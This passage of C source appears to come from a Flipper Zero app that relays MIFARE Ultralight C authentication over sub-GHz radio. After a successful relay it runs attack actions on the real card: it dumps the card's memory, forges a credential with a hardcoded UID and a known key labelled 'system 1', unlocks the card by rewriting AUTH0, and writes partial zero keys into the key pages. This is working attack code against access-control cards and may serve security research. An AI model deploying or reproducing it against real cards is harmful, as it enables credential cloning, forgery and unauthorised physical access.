    gui_add_view_port(app->gui, app->view_port, GuiLayerFullscreen);

    bool running = true;
    AppEvent event;

    while(running) {
        FuriStatus status = furi_message_queue_get(app->event_queue, &event, 100);

        if(status == FuriStatusOk) {
            if(event.type == EventTypeKey &&
               (event.input.type == InputTypeShort ||
                (app->state == AppStateHelp && event.input.type == InputTypeRepeat))) {
                // Handle states
                if(app->state == AppStateMain) {
                    // Main screen
                    switch(event.input.key) {
                    case InputKeyBack:
                        do_shutdown(app);
                        running = false;
                        break;
                    case InputKeyOk:
                        app->state = AppStateEmulateOrRead;
                        break;
                    case InputKeyRight:
                        app->state = AppStateHelp;
                        break;
                    default:
                        break;
                    }
                } else if(app->state == AppStateHelp) {
                    switch(event.input.key) {
                    case InputKeyBack:
                        app->state = AppStateMain;
                        break;
                    case InputKeyUp:
                        if(app->help_state->scroll_pos > 0) {
                            app->help_state->scroll_pos--;
                        }
                        break;
                    case InputKeyDown:
                        if(app->help_state->scroll_pos < app->help_state->scroll_num - 1) {
                            app->help_state->scroll_pos++;
                        }
                        break;
                    default:
                        break;
                    }
                } else if(app->state == AppStateEmulateOrRead) {
                    switch(event.input.key) {
                    case InputKeyLeft:
                        app->state = AppStateReaderSideInit;
                        break;
                    case InputKeyRight:
                        app->state = AppStateChooseCardMode;
                        break;
                    case InputKeyBack:
                        app->state = AppStateMain;
                        break;
                    default:
                        break;
                    }
                } else if(app->state == AppStateChooseCardMode) {
                    switch(event.input.key) {
                    case InputKeyLeft:
                        if(app->postauth_mode > AppPostauthModeRead) {
                            app->postauth_mode--;
                        }
                        break;
                    case InputKeyRight:
                        if(app->postauth_mode < AppPostauthModeKey4) {
                            app->postauth_mode++;
                        }
                        break;
                    case InputKeyOk:
                        app->state = AppStateCardSideInit;
                        break;
                    case InputKeyBack:
                        app->state = AppStateEmulateOrRead;
                        break;
                    default:
                        break;
                    }
                }
            } else if(event.type == EventTypeRx) {
                handle_rx(app);
            }
        }

        // Ongoing tasks
        if(app->state == AppStateReaderSideInit) {
            app->mode = AppModeReaderSide;
            notification_message(app->notifications, &sequence_blink_start_blue);

            // Reader side => wait for AUTH1 from the card side via CC1101
            FURI_LOG_I(TAG, "Reader side => wait for AUTH1 via CC1101");
            app->state = AppStateWaitingForAuth1;
            app->subghz_txrx = subghz_tx_rx_worker_alloc();
            subghz_devices_init();
            const SubGhzDevice* device = subghz_devices_get_by_name(SUBGHZ_DEVICE_CC1101_INT_NAME);
            furi_assert(device);

            // Start SubGHz on default frequency
            if(subghz_tx_rx_worker_start(app->subghz_txrx, device, DEFAULT_FREQUENCY)) {
                subghz_tx_rx_worker_set_callback_have_read(
                    app->subghz_txrx, rx_event_callback, app);
            }

            // All the subghz apps disable charging; so we do it too
            furi_hal_power_suppress_charge_enter();
        } else if(app->state == AppStateCardSideInit) {
            app->mode = AppModeCardSide;
            notification_message(app->notifications, &sequence_blink_start_cyan);
            // Card side => enable NFC, do anticoll, send AUTH1
            furi_hal_spi_acquire(&furi_hal_spi_bus_handle_nfc);

            uint8_t chip_id = 0;
            st25r3916_read_reg(&furi_hal_spi_bus_handle_nfc, ST25R3916_REG_IC_IDENTITY, &chip_id);
            if((chip_id & ST25R3916_REG_IC_IDENTITY_ic_type_mask) !=
               ST25R3916_REG_IC_IDENTITY_ic_type_st25r3916) {
                app->state = AppStateError;
                app->error = "Wrong NFC chip ID";
                notification_message(app->notifications, &sequence_error);
                furi_hal_spi_release(&furi_hal_spi_bus_handle_nfc);
                continue;
            }

            setup_nfc_field(&furi_hal_spi_bus_handle_nfc);
            app->field_active = true;
            app->state = AppStateNfcActive;
        } else if(app->state == AppStateNfcActive) {
            // Wait for card to be detected
            if(initialize_card(&furi_hal_spi_bus_handle_nfc, app) &&
               send_auth1_command(&furi_hal_spi_bus_handle_nfc, app)) {
                // Successfully read and sent AUTH1, now we can proceed to wait for AUTH2
                app->state = AppStateWaitingForAuth2;
                app->auth2_received = false;
                FURI_LOG_I(TAG, "Card side => waiting for AUTH2 from Reader side");

                app->subghz_txrx = subghz_tx_rx_worker_alloc();
                subghz_devices_init();
                const SubGhzDevice* device =
                    subghz_devices_get_by_name(SUBGHZ_DEVICE_CC1101_INT_NAME);
                furi_assert(device);

                // Start SubGHz on default frequency
                if(subghz_tx_rx_worker_start(app->subghz_txrx, device, DEFAULT_FREQUENCY)) {
                    subghz_tx_rx_worker_set_callback_have_read(
                        app->subghz_txrx, rx_event_callback, app);
                }

                // All the subghz apps disable charging; so we do it too
                furi_hal_power_suppress_charge_enter();
            } else {
                FURI_LOG_E(TAG, "Init card fail, retrying...");
                disable_nfc_field(&furi_hal_spi_bus_handle_nfc);
                furi_delay_ms(50);
                setup_nfc_field(&furi_hal_spi_bus_handle_nfc);
            }
        } else if(app->mode == AppModeCardSide && app->state == AppStateWaitingForAuth2) {
            if(app->auth2_received) {
                // Shut down subghz_tx_rx_worker
                if(subghz_tx_rx_worker_is_running(app->subghz_txrx)) {
                    subghz_tx_rx_worker_stop(app->subghz_txrx);
                }
                subghz_tx_rx_worker_free(app->subghz_txrx);
                subghz_devices_deinit();

                // Resume charging
                furi_hal_power_suppress_charge_exit();

                // We have AUTH2 => pass to real card
                furi_hal_spi_acquire(&furi_hal_spi_bus_handle_nfc);

                // 0xAF + 16 bytes + CRC
                uint8_t auth2_cmd[17] = {0xAF};
                memcpy(&auth2_cmd[1], app->auth2_response, 16);

                uint8_t rx_buffer[32];
                size_t rx_bits = 0;
                if(send_receive_command(
                       &furi_hal_spi_bus_handle_nfc,
                       auth2_cmd,
                       17 * 8,
                       rx_buffer,
                       sizeof(rx_buffer),
                       &rx_bits,
                       false,
                       true) &&
                   rx_bits == 88 && rx_buffer[0] == 0x00) {
                    app->state = AppStateRelayComplete;
                    notification_message(app->notifications, &sequence_success);

                    // Zero the rx_buffer and rx_bits
                    rx_bits = 0;
                    memset(rx_buffer, 0, sizeof(rx_buffer));

                    if(app->postauth_mode == AppPostauthModeRead ||
                       app->postauth_mode == AppPostauthModeCredForge1) {
                        // Read all memory pages
                        uint8_t read_cmd[2] = {0x30, 0x00};
                        MfUltralightPage* pages = malloc(48 * sizeof(MfUltralightPage));
                        FURI_LOG_I(TAG, "Reading memory pages:");

                        for(uint8_t page = 0x00; page <= 0x28; page += 4) {
                            read_cmd[1] = page;
                            if(send_receive_command(
                                   &furi_hal_spi_bus_handle_nfc,
                                   read_cmd,
                                   2 * 8,
                                   rx_buffer,
                                   sizeof(rx_buffer),
                                   &rx_bits,
                                   false,
                                   true)) {
                                if(page == 0x28) {
                                    // Second lock byte determines if the card is vulnerable
                                    app->is_vulnerable = ((rx_buffer[1] & 0x80) >> 7) ^ 1;
                                }
                                for(uint8_t i = 0; i < 4; i++) {
                                    char hex_str[16];
                                    snprintf(
                                        hex_str,
                                        sizeof(hex_str),
                                        "%02X %02X %02X %02X",
                                        rx_buffer[i * 4],
                                        rx_buffer[i * 4 + 1],
                                        rx_buffer[i * 4 + 2],
                                        rx_buffer[i * 4 + 3]);
                                    FURI_LOG_I(TAG, "Page 0x%02X: %s", page + i, hex_str);
                                }
                                memcpy(pages[page].data, rx_buffer, 16);
                            } else {
                                FURI_LOG_E(
                                    TAG, "Failed to read pages 0x%02X-0x%02X", page, page + 3);
                            }
                        }

                        // Save the card to file
                        NfcDevice* dumped_card = NULL;
                        if(app->postauth_mode == AppPostauthModeRead) {
                            dumped_card =
                                ultralight_c_nfc_device_alloc_full(app->uid + 1, pages, false);
                        } else if(app->postauth_mode == AppPostauthModeCredForge1) {
                            // Forge a credential for system 1
                            // UID: 04 BD 8D 32 A3 78 80
                            uint8_t forged_uid[7] = {0x04, 0xBD, 0x8D, 0x32, 0xA3, 0x78, 0x80};
                            memcpy(pages[0x00].data, forged_uid, 7);
                            // Key: 140C92C85C84B414B494089A74E0A276
                            static const uint8_t KNOWN_KEY[][4] = {
                                {0x14, 0xB4, 0x84, 0x5C}, // 2C
                                {0xC8, 0x92, 0x0C, 0x14}, // 2D
                                {0x76, 0xA2, 0xE0, 0x74}, // 2E
                                {0x9A, 0x08, 0x94, 0xB4}, // 2F
                            };
                            for(uint8_t i = 0; i < 4; i++) {
                                memcpy(pages[0x2C + i].data, KNOWN_KEY[i], 4);
                            }
                            dumped_card =
                                ultralight_c_nfc_device_alloc_full(forged_uid, pages, true);
                        }
                        if(dumped_card) {
                            const char* filename_prefix =
                                (app->postauth_mode == AppPostauthModeRead) ? "ulcrelay_dump" :
                                                                              "ulcrelay_forge";
                            FuriString* dump_path = furi_string_alloc_printf(
                                NFC_APP_FOLDER
                                "/%s_%02X%02X%02X%02X%02X%02X%02X" NFC_APP_EXTENSION,
                                filename_prefix,
                                app->uid[1],
                                app->uid[2],
                                app->uid[3],
                                app->uid[4],
                                app->uid[5],
                                app->uid[6],
                                app->uid[7]);
                            nfc_device_save(dumped_card, furi_string_get_cstr(dump_path));
                            furi_string_free(dump_path);
                            nfc_device_free(dumped_card);
                        }
                        // Free the pages array
                        free(pages);
                    } else if(app->postauth_mode == AppPostauthModeKDFCheck) {
                        app->is_static_key = true;
                        app->state = AppStateKDFCheckResult;
                    } else if(app->postauth_mode == AppPostauthModeUnlock) {
                        // Write to the AUTH0 page (0x2A) 0x30 0x00 0x00 0x00
                        uint8_t write_cmd[6] = {0xA2, 0x2A, 0x30, 0x00, 0x00, 0x00};
                        if(send_receive_command(
                               &furi_hal_spi_bus_handle_nfc,
                               write_cmd,
                               6 * 8,
                               rx_buffer,
                               sizeof(rx_buffer),
                               &rx_bits,
                               false,
                               true) &&
                           rx_bits == 8 && rx_buffer[0] == 0x0A) {
                            FURI_LOG_I(TAG, "Unlock success");
                        } else {
                            FURI_LOG_E(TAG, "Unlock failed, rx_bits: %d", rx_bits);
                        };
                    } else if(
                        app->postauth_mode == AppPostauthModeKey1 ||
                        app->postauth_mode == AppPostauthModeKey2 ||
                        app->postauth_mode == AppPostauthModeKey3 ||
                        app->postauth_mode == AppPostauthModeKey4) {
                        uint8_t write_cmd[6] = {0xA2, 0x2C, 0x00, 0x00, 0x00, 0x00};
                        uint8_t start_page = 0x2C;
                        uint8_t skip_page =
                            start_page + (app->postauth_mode - AppPostauthModeKey1);
                        for(uint8_t i = 0; i < 4; i++) {
                            uint8_t current_page = start_page + i;
                            if(current_page == skip_page) {
                                continue;
                            }
                            write_cmd[1] = current_page;
                            if(send_receive_command(
                                   &furi_hal_spi_bus_handle_nfc,
                                   write_cmd,
                                   6 * 8,
                                   rx_buffer,
                                   sizeof(rx_buffer),
                                   &rx_bits,
                                   false,
                                   true)) {
                                FURI_LOG_I(
                                    TAG, "Wrote partial zero key to page 0x%02X", current_page);
                                continue;
                            } else {
                                FURI_LOG_E(
                                    TAG,
                                    "Failed to write partial key to page 0x%02X",
                                    current_page);
                            }
                        }
                    }
                } else if(app->postauth_mode == AppPostauthModeKDFCheck) {
                    app->is_static_key = false;
                    app->state = AppStateKDFCheckResult;
                } else {
                    app->state = AppStateError;
                    app->error = "AUTH2 fail";
                    notification_message(app->notifications, &sequence_error);
                }

                disable_nfc_field(&furi_hal_spi_bus_handle_nfc);
                app->field_active = false;
                furi_hal_spi_release(&furi_hal_spi_bus_handle_nfc);
            }
        } else if(app->mode == AppModeReaderSide && app->state == AppStateEmulatingCardInit) {
            app->state = AppStateEmulatingCard;

            // Shut down subghz_tx_rx_worker
            if(subghz_tx_rx_worker_is_running(app->subghz_txrx)) {
                subghz_tx_rx_worker_stop(app->subghz_txrx);
            }
            subghz_tx_rx_worker_free(app->subghz_txrx);
            subghz_devices_deinit();

            // Create an NFC listener using the iso14443_3a listener
            app->nfc = nfc_alloc();
            app->device = ultralight_c_nfc_device_alloc(app->uid);
            NfcProtocol protocol = nfc_device_get_protocol(app->device);
            FURI_LOG_I(TAG, "NFC: Protocol %s", nfc_device_get_protocol_name(protocol));
            app->listener =
                nfc_listener_alloc(app->nfc, protocol, nfc_device_get_data(app->device, protocol));
            FURI_LOG_I(TAG, "NFC: Starting...");
            nfc_listener_start(app->listener, ulcrelay_listener_callback, app);
        } else if(app->mode == AppModeReaderSide && app->state == AppStateEmulatingCardDone) {
            nfc_listener_stop(app->listener);
            nfc_listener_free(app->listener);
            nfc_free(app->nfc);
            nfc_device_free(app->device);

            send_auth2_command(app);

            app->state = AppStateRelayComplete;
            notification_message(app->notifications, &sequence_success);
        }

        view_port_update(app->view_port);
    }

    // Cleanup
    if(app->subghz_txrx) {
        if(subghz_tx_rx_worker_is_running(app->subghz_txrx)) {
            subghz_tx_rx_worker_stop(app->subghz_txrx);
        }
        subghz_tx_rx_worker_free(app->subghz_txrx);
        subghz_devices_deinit();
    }

    // Re-enable charging
    furi_hal_power_suppress_charge_exit();

    view_port_enabled_set(app->view_port, false);
    gui_remove_view_port(app->gui, app->view_port);
    view_port_free(app->view_port);
    furi_record_close(RECORD_GUI);

    furi_string_free(app->data->message);
    free(app->data);
    furi_message_queue_free(app->event_queue);
    furi_record_close(RECORD_NOTIFICATION);
    furi_mutex_free(app->nfc_mutex);
    furi_mutex_free(app->subghz_mutex);

    free(app);
    return 0;
}
